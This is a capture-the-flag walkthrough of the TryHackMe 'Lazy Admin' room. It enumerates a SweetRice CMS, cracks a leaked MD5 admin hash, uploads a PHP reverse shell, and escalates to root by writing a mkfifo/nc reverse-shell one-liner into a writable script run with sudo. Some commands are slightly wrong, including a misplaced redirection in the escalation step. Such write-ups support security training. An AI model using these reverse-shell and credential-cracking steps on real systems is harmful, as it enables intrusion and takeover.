#Lazy Admin

https://tryhackme.com/room/lazyadmin

1. user flag
	echo <machine-ip> lazyadmin.com >> /etc/hosts

##Enumeration
nmap -sC -sV -oN nmap.txt lazyadmin.com
```nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 04:08 EDT
Nmap scan report for lazyadmin.com (10.10.240.121)
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.82 seconds
```
```bash
firefox lazyadmin.com
```
We will run gobuster to enumerate the website
```bash
gobuster dir -u http://lazyadmin.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 35
```
```
/content
```
```bash
firefox lazyadmin.com/content
```
```lazyadmin.com/content
Welcome to SweetRice - Thank your for install SweetRice as your website management system.
This site is building now , please come late.

If you are the webmaster,please go to Dashboard -> General -> Website setting

and uncheck the checkbox "Site close" to open your website.

More help at Tip for Basic CMS SweetRice installed
```
```bash
gobuster dir -u http://lazyadmin.com/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 35
```
```
/inc
```
```bash
firefox lazyadmin.com/content/inc
```
```
we will see a folder named mysql_backup
navigate to mysql_backup and download the file
open the file using any text editor i use vim
```
```downloaded_sql_file
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\
"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:
\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"
<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p>
```
```creds
manager : 42f749ade7f9e195bf475f37a44cafcb(MD5)
```
```bash
echo 42f749ade7f9e195bf475f37a44cafcb > hash.txt
john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```creds
manager : Password123
```
```bash
firefox lazyadmin.com/content/as
```
and enter the creds to login
and navigate to media center
and upload the reverse shell if you dont have you can download it from the link below
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
after changing the ip address and renaming it to revshell.php5
we see the file is uploaded
open terminal and execute this
```bash
nc -lnvp 4444
``` 
now click on the uploaded file
and we got a shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
enter these two commands to spawn a tty terminal
move to /home/itguy

```
we got the user flag
```

2. root flag

##Privilege Escalation
```mysql.backup
rice : randompass
```
```back.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
this script executes another script /etc/copy.sh

```bash 
cat /etc/copy.sh
```
```contents_of_copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
Luckily we can write into copy.sh 
now all we need to do is insert a reverse shell
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip> 5554" >/tmp/f > copy.sh
```
open a new terminal and run this command
```bash
nc -lnvp 5554
```
then go victim shell and execute this command
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```
```
we got the user flag
```
